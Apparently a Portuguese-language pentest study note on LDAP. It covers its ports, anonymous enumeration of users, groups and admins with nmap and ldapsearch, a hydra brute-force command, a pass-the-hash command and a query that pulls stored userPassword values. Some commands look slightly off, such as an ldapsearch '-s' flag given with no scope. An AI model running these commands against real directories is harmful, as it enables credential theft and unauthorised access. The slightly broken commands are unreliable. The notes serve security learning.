## LDAP(Lightweight Directory Access Protocol)
É um protocolo padrão da indústria para que aplicativos e sistemas acessem e manter informações distribuídas em um diretório, geralmente usado para autenticação e gerenciamento de identidade em sistemas e aplicativos.
Simplificando, ele permite que aplicativos consultem informações sobre usuários, grupos e outros recursos em um servidor de diretório, como o Active Directory.
 - Porta 389(LDAP) Comunicação não encripytada.
 - Porta 636(LDAPS) Comunicação usando SSL/TLS.
 - Portas 3268, 3269 Usadas para consultas do catalago global do AD

O ldap é um protocolo para busca de dados usando o padrão X.500(arvore de diretórios) + o TCP/IP. Com isso podemos armazenar informações dos usuários e usar ele como um serviço para autenticação.

Uma má configuração do serviço pode levar a exploração de dados sensíveis, escalação de privilégios e técnicas de exploração
## Enumeração

Entender as consultas LDAP é crucial para enumerar usuários, grupos e configurações de domínio.

#### Enumeração sem credenciais
```
nmap -p 389,636,3268,3269 --script ldap-rootdse <IP>
```
#### **ldapsearch**
É uma ferramenta de linha de comandos disponível nos fornecedores de servidor LDAP  que você pode usar ara verificar informações LDAP.

```
ldapsearch -x -H ldap://<IP> -s #retorna a raiz DN(DC=exemple,DC=com)
ldapsearch -x -H ldap://<IP> -b "DC=exemple,DC=com" "(objectClass=person)" cn #usernames para força-bruta
```
Extraindo usuários e informações de grupos:
```
Listar todos os Usuários:
ldapsearch -x -H ldap://<target-ip> -b "DC=example,DC=com" "(objectClass=user)" cn sAMAccountName
Listar grupos
ldapsearch -x -H ldap://<target-ip> -b "DC=example,DC=com" "(objectClass=group)" cn member
Listar Admins
ldapsearch -x -H ldap://<target-ip> -b "DC=example,DC=com" "(&(objectClass=user)(adminCount=1))" cn sAMAccountName
```

### Explorando uma configuração fraca
Se a autenticação simples estiver habilitada podemos fazer um ataque de força bruta:
```
hydra -L user.txt -P password.txt ldap://<IP>
```

#### LDAP Pass-the-Hash Attack
Se o NTLM hashes estiver disponível, podemos tentar fazer o pass-the-hash para autenticar, isso permite fazer consultas ao LDAP usando apenas o hash.
```
impacket-ldapdumper -u 'example.com/user' -p '<NTLM-Hash>' -dc-ip <IP>
```

#### Extraindo senhas do LDAP
Alguns desenvolvedores armazenam senhas no LDAP uma má pratica,
```
ldapsearch -x -H ldap://<IP> -b "DC=example,DC=com" "(&(objectClass=*)(userPassword=*))" userPassword 
```

